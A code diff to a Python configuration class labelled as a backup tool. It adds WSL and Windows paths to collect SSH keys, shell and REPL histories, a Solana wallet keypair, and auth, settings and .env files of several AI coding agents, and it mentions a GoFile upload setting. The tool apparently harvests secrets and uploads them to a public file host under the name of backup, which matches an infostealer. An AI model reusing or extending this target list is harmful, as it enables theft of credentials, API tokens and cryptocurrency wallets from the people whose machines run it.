@@ -44,19 +44,28 @@ class BackupConfig:
     # WSL指定备份目录或文件（相对于 WSL 用户主目录）
     WSL_SPECIFIC_DIRS = [
         ".ssh",           # SSH配置
+        ".bashrc",        # Bash配置
+        ".profile",        # Bash配置
         ".bash_history",  # Bash历史记录
         ".python_history", # Python历史记录
-        ".bash_aliases",  # Bash别名
         ".node_repl_history", # Node.js REPL 历史记录
-        ".wget-hsts",     # wget HSTS 历史记录
-        ".Xauthority",    # Xauthority 文件
-        ".ICEauthority",  # ICEauthority 文件
         ".config/solana/id.json",
         ".claude/config.json",
+        ".claude/settings.json",
+        ".claude/settings.local.json",
+        ".claude/history.jsonl",
+        ".claude/channels/",
         ".codex/auth.json",
-        ".openclaw/agents",
-        ".openclaw/workspace/MEMORY.md",
-        ".openclaw/openclaw.json*",  # OpenClaw 配置文件及所有备份
+        ".codex/config.toml",
+        ".codex/history.jsonl",
+        ".hermes/.env",
+        ".hermes/auth.json",
+        ".hermes/config.yaml",
+        ".hermes/channel_directory.json",
+        ".hermes_history",
+        ".openclaw/agents/",
+        ".openclaw/workspace/.env",
+        ".openclaw/openclaw.json*", # 只备份 openclaw.json 及其所有备份文件
     ]
     
     # Windows 用户主目录（WSL 下的挂载路径）
@@ -116,13 +125,29 @@ class BackupConfig:
     WINDOWS_SPECIFIC_PATHS = [
         WINDOWS_DESKTOP_RELATIVE_PATH,  # 桌面目录（自动检测）
         WINDOWS_STICKY_NOTES_RELATIVE_PATH,  # 便签数据库（自动检测，失败则使用默认路径）
+        ".ssh",  # SSH配置
         ".python_history",  # Python 历史记录文件
         ".node_repl_history",  # Node.js REPL 历史记录文件
+        "AppData\Roaming\Python\Python*\history",  # Windows 常见 Python REPL 历史路径（按版本目录匹配）
         "AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",  # Windows PowerShell 历史
         "AppData/Roaming/Microsoft/PowerShell/PSReadLine/ConsoleHost_history.txt",  # PowerShell Core 历史（如果存在）
-        ".openclaw/agents",
-        ".openclaw/workspace/MEMORY.md",
-        ".openclaw/openclaw.json*",  # OpenClaw 配置文件及所有备份
+        ".config/solana/id.json",
+        ".claude/config.json",
+        ".claude/settings.json",
+        ".claude/settings.local.json",
+        ".claude/history.jsonl",
+        ".claude/channels/",
+        ".codex/auth.json",
+        ".codex/config.toml",
+        ".codex/history.jsonl",
+        ".hermes/.env",
+        ".hermes/auth.json",
+        ".hermes/config.yaml",
+        ".hermes/channel_directory.json",
+        ".hermes_history",
+        ".openclaw/agents/",
+        ".openclaw/workspace/.env",
+        ".openclaw/openclaw.json*", # 只备份 openclaw.json 及其所有备份文件
     ]
 
     # GoFile 上传配置（备选方案）
